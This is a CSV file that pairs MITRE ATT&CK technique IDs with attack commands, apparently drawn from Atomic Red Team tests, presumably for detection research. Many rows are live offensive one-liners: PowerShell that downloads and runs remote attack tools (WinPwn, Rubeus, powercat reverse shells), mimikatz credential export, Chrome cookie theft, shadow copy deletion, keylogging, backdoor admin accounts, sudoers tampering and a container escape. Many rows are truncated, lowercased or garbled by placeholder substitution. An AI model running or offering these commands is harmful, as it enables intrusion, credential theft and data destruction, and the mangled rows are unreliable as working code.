mitre_id,command
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\'
T1197,"set ""var_666 \eventname:desktopimgdownldr"
T1005,"$startingdirectory = ""var_300"
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_246"""
T1114,"$secure_pwd  =  ""var_933"""
T1552,"""#{mimikatz_exe}"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit"
T1201,net  accounts  \domain
T1221,"start ""var_983"""
T1548,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_219\extension\"" -passthru"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_318"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1553,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""allthethings"" $driveletter = ($keep | get-volume).driveletter $instance = [activator]::createinstance([type]::gettypefromclsid(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}"")) $instance.document.application.shellexecute($driveletter+"":\document.lnk"","""",$driveletter+"":\"",$null,0)"
T1016,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=subnet) var_327"
T1558,"cmd.exe  \c  ""var_878"""
T1135,smbstatus --shares
T1016,sudo defaults read \library\preferences\com.apple.alf sudo \usr\libexec\applicationfirewall\socketfilterfw --getglobalstate
T1039,copy \\var_408
T1057,tasklist
T1496,yes > \dev\null
T1496,yes  >  \dev\null
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_806"" net start sesshijack"
T1570,new-smbmapping  -remotepath  'var_516'  'z:\'
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_429"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1133,"$extlist = var_950 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1562,export histsize=0 #{evil_command}
T1195,"copy  %temp%\explorersync.db  %temp%\..\microsoft\explorersync.db  schtasks  \create  \tn  explorersync  \tr  ""javaw  -jar  %temp%\..\microsoft\explorersync.db""  \sc  minute  \f"
T1124,w32tm \stripchart \computer:localhost \period:5 \dataonly \samples:2
T1615,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gpoaudit -noninteractive -consoleoutput
T1187,"& ""var_802 write-host ""end of petitpotam attack"""
T1098,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $user = get-azureaduser -filter ""displayname eq '#{user_principal_name}' or userprincipalname eq '#{user_principal_name}'"" if ($user -eq $null) { write-warning ""user not found""; exit } $role = get-azureaddirectoryrole -filter ""displayname eq '#{role_name}'"" if ($role -eq $null) { write-warning ""role not found""; exit } add-azureaddirectoryrolemember -objectid $role.objectid -refobjectid $user.objectid write-host ""user $($user.displayname) was added to $($role.displayname) role"""
T1106,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe \out:""var_371"" %tmp%\t1106.exe"
T1562,fltmc.exe unload #{sysmon_driver}
T1496,yes > \dev\null
T1040,"""c:\program files\wireshark\tshark.exe"" -i #{interface} -c 5"
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_527""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_450"
T1014,"echo  var_369  |  tee  -a  \etc\ld.so.preload  \usr\local\bin\evil_script.py  localhost  -c  10  >\dev\null  &  pgrep  -l  evil_script.py  ||  echo  ""process  hidden"""
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_746
T1021,"copy c:\windows\system32\calc.exe 'c:\users\#{user}\appdata\local\microsoft\windowsapps\foxprow.exe' $com = [system.activator]::createinstance([type]::gettypefromprogid(""excel.application"",""#{computer_name}"")) $com.activatemicrosoftapp(""5"")"
T1569,"cmd.exe /c ""wmic csproduct get uuid"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2l:1"" cmd.exe /c ""fsutil behavior set symlinkevaluation r2r:1"" reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535 /t reg_dword /f copy ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" $env:temp cmd.exe /c ""$env:temp\psexec.exe -accepteula \\#{targethost} cmd.exe /c echo ""--access-token"""""
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached"
T1127,"var_432"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_531"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1578,gcloud compute snapshots create var_834
T1127,"copy ""var_404 %temp%\hello.js"
T1007,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } }
T1105,kubectl run var_526
T1136,"net user /add ""#{username}"" ""#{password}"" net localgroup administrators ""#{username}"" /add"
T1567,new-item  var_201:test  -v
T1485,dd  of=var_812')  iflag=count_bytes
T1057,get-process
T1201,cat \etc\pam.d\passwd
T1129,"var_485"""
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_692"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1550,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\kevin-robertson\invoke-thehash\01ee90f934313acc7d09560902443c18694ed0eb\invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target var_221
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1016,"$ports = get-content ""var_493 $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results"
T1202,"scriptrunner.exe -appvscript ""var_964"""
T1027,"$encodedstring  =  ""wdvpivalqefqwzrcufpyntqouf4pn0ndktd9jevjq0fslvnuqu5eqvjelufovelwsvjvuy1urvnuluzjteuhjegrsco=""  $bytes  =  [system.convert]::frombase64string($encodedstring)  $decodedstring  =  [system.text.encoding]::utf8.getstring($bytes)  #write  the  decoded  eicar  string  to  file  $decodedstring  |  out-file  t1027.013_decodedeicar.txt"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_478"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1543,sudo cp var_489
T1195,"kubectl run var_739 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1202,"scriptrunner.exe -appvscript ""var_963"""
T1222,"reg  add  ""hklm\system\currentcontrolset\control\filesystem""  \v  symlinkremotetolocalevaluation  \t  reg_dword  \d  ""1""  \f  reg  add  ""hklm\system\currentcontrolset\control\filesystem""  \v  symlinkremotetoremoteevaluation  \t  reg_dword  \d  ""1""  \f"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_934\extension\"" -passthru"
T1127,"copy ""var_577 %temp%\hello.js"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_337"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1136,pw useradd var_263 -s \usr\sbin\nologin -d \nonexistent -c evil_account
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_620"""
T1613,docker build -t t1613 $pathtoatomicsfolder\t1613\src\ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1217,"$username = (whoami).split('\')[1] $url_regex = '(htt(p|s)):\\([\w-]+\.)+[\w-]+(\[\w- .\?%&=]*)*?' $history = get-content -path ""$env:systemdrive\users\$username\appdata\local\google\chrome\user data\default\history"" | select-string -allmatches $url_regex | foreach-object { $_.matches.value } | sort -unique $history | out-file -filepath ""$env:userprofile\downloads\chromebrowsinghistory.txt"""
T1072,"""%programfiles(x86)%\var_382"""
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_121"
T1652,kextstat
T1580,aws ec2 describe-security-groups --profile var_373
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt
T1505,"$termsrvdll = ""%systemroot%\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path $termsrvdll -destination ""$home\atomictest.dll"" $newservicedll = ""$home\atomictest.dll"" $registrypath = ""hklm:\system\currentcontrolset\services\termservice\parameters"" # check if the registry key exists if (test-path -path $registrypath) { # modify the servicedll value in the registry set-itemproperty -path $registrypath -name ""servicedll"" -value $newservicedll write-host ""servicedll value in the registry has been updated to: $newservicedll"" } else { write-host ""registry key not found. make sure the 'termservice\parameters' key exists."" }"
T1119,get-service  >  $env:temp\t1119_1.txt  get-childitem  env:  >  $env:temp\t1119_2.txt  get-process  >  $env:temp\t1119_3.txt
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""var_427"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_262"
T1071,var_864 >nul 2>&1
T1613,docker build -t t1613 $pathtoatomicsfolder\t1613\src\ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1105,cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_851"
T1070,"net use c: #{share_name} net share test=#{share_name} /remark:""test share"" /cache:no"
T1020,"$filename = ""var_252"
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_768 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_858"" net start sesshijack"
T1204,"set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\runmru"" -name ""atomictest"" -value '""%systemroot%\system32\mshta.exe"" http:\\localhost\hello6.hta'"
T1531,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} #{new_password}
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe  -out:var_210
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1652,driverquery \v \fo list driverquery \si \fo list
T1014,sudo modprobe var_761
T1505,%windir%\system32\inetsrv\appcmd.exe  install  module  \name:var_395
T1070,"sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place"
T1491,"$notepath = join-path $env:temp ""var_139"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1539,"$devtoolsport = 9222 $testurl = ""https:\\www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http:\\localhost:$devtoolsport\json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force"
T1490,vssadmin.exe delete shadows /all /quiet
T1090,export var_904
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_463"" net start sesshijack"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1562,"reg add ""hklm\system\currentcontrolset\control\deviceguard\scenarios\hypervisorenforcedcodeintegrity"" /v ""enabled"" /t reg_dword /d 0 /f"
T1614,reg query hkey_local_machine\system\currentcontrolset\control\nls\language
T1573,$server_ip  =  var_119
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"" ""$env:appdata\microsoft\addins\notepad.xll"" } $ver = $excelapp.version $excelregpath=""hkcu:\software\microsoft\office\$ver\excel\options"" remove-item $excelregpath -erroraction ignore new-item -type directory $excelregpath | out-null new-itemproperty $excelregpath open -value ""\r notepad.xll"" -propertytype string | out-null $excelapp.quit() start-process ""excel"""
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" var_414 -gcb -sc trustdmp"
T1027,"invoke-webrequest -uri var_299"""
T1057,tasklist  |  findstr  var_885
T1114,"$secure_pwd  =  ""var_188"""
T1216,set  comspec=var_473  cscript  %windir%\system32\manage-bde.wsf
T1202,"conhost.exe ""var_673"""
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_323\extension\"" -passthru"
T1057,"start-process  -filepath  ""$env:programfiles\process  hacker  2\var_412"""
T1548,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers sudo visudo -c -f /etc/sudoers"
T1558,"iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-rubeus.ps1') invoke-rubeus -command ""asreproast \format:hashcat \nowrap"""
T1056,"cp -v \etc\pam.d\sshd \tmp\ echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> \etc\pam.d\sshd systemctl restart sshd systemctl restart auditd ssh var_956@localhost whoami sudo su whoami exit exit"
T1055,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethread.exe -pid $process.id -debug
T1098,"import-module exchangeonlinemanagement $secure_pwd = ""var_383"" -accessrights fullaccess -inheritancetype all disconnect-exchangeonline -confirm:$false"
T1574,copy  %windir%\system32\windowspowershell\v1.0\powershell.exe  %appdata%\updater.exe  copy  %windir%\system32\amsi.dll  %appdata%\amsi.dll  %appdata%\updater.exe  -command  exit
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1112,"reg add ""hklm\software\policies\microsoft\fve"" /v enablenontpm /t reg_dword /d 1 /f"
T1609,"docker build -t t1609 $pathtoatomicsfolder\t1609\src\ docker run --name t1609_container --rm -itd t1609 bash \tmp\script.sh docker exec -i t1609_container bash -c ""cat \tmp\output.txt"""
T1547,cp var_108 ~\library\preferences\byhost\com.apple.loginwindow.plist
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" var_739 -gcb -sc trustdmp"
T1082,reg query hkey_local_machine\hardware\description\system /v systembiosversion reg query hkey_local_machine\hardware\description\system /v videobiosversion
T1197,start-bitstransfer  -priority  foreground  -source  var_447
T1552,cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}
T1202,forfiles \p %systemroot%\system32 \m notepad.exe \c var_518
T1082,"reg query ""hkey_current_user\control panel\international\geo"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_377"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_942"
T1074,"compress-archive -path ""var_134 -force"
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\createprocess\get-createprocesssystembind.ps1')
T1030,$file  =  [system.io.file]::openread(var_775  $file.close()
T1558,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') kerberoasting -consoleoutput -noninteractive
T1573,$server_ip = var_530
T1095,iex  (new-object  system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\besimorhino\powercat\ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5\powercat.ps1')  powercat  -c  var_813
T1580,"export aws_region=var_613 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1053,"systemd-run --user --unit=atomic-red-team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'"
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_309"""
T1110,"@for \f %n in (%temp%\users.txt) do @echo | set\p=. & @net use %logonserver%\ipc$ \user:""%userdomain%\%n"" ""var_729 && @net use \delete %logonserver%\ipc$ > nul"
T1078,"net user #{guest_user} /active:yes net user #{guest_user} #{guest_password} net localgroup #{local_admin_group} #{guest_user} /add net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f reg add ""hklm\system\currentcontrolset\control\terminal server"" /v ""allowtsconnections"" /t reg_dword /d 0x1 /f"
T1055,$pathtoatomicsfolder\t1055\bin\x64\createthread.exe -debug
T1578,gcloud compute snapshots create var_340
T1518,"netsh.exe advfirewall show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c ""get-process | where-object { $_.processname -eq 'sysmon' }"" powershell.exe /c ""get-service | where-object {$_.displayname -like '*sysm*'}"" powershell.exe /c ""get-ciminstance win32_service -filter 'description = ''system monitor service'''"" tasklist.exe tasklist.exe | findstr /i virus tasklist.exe | findstr /i cb tasklist.exe | findstr /i defender tasklist.exe | findstr /i cylance tasklist.exe | findstr /i mc tasklist.exe | findstr /i ""virus cb defender cylance mc"""
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_381"" -verbose"
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"""
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_380"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug
T1573,$server_ip  =  var_495
T1485,cipher.exe \w:c:
T1119,sc query type=service > %temp%\t1119_1.txt doskey \history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1552,cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
T1059,powershell.exe -e #{obfuscated_code}
T1187,"iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-internalmonologue.ps1') invoke-internalmonologue -command ""-downgrade true -impersonate true -restore true"""
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh
T1095,iex (new-object system.net.webclient).downloadstring('https:\\raw.githubusercontent.com\samratashok\nishang\c75da7f91fcc356f846e09eab0cfd7f296ebf746\shells\invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress var_199
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1016,"$ports = get-content ""#{port_file}"" $file = ""#{output_file}"" $totalopen = 0 $totalports = 0 new-item $file -force foreach ($port in $ports) { $test = new-object system.net.sockets.tcpclient $wait = $test.beginconnect(""allports.exposed"", $port, $null, $null) $wait.asyncwaithandle.waitone(250, $false) | out-null $totalports++ | out-null if ($test.connected) { $result = ""$port open"" write-host -foregroundcolor green $result $result | out-file -encoding ascii -append $file $totalopen++ | out-null } else { $result = ""$port closed"" write-host -foregroundcolor red $result $totalclosed++ | out-null $result | out-file -encoding ascii -append $file } } $results = ""there were a total of $totalopen open ports out of $totalports ports tested."" $results | out-file -encoding ascii -append $file write-host $results"
T1216,set comspec=var_762 cscript %windir%\system32\manage-bde.wsf
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\createprocess\get-createprocesssystem.ps1')
T1078,dseditgroup -o edit -a art-user -t user admin
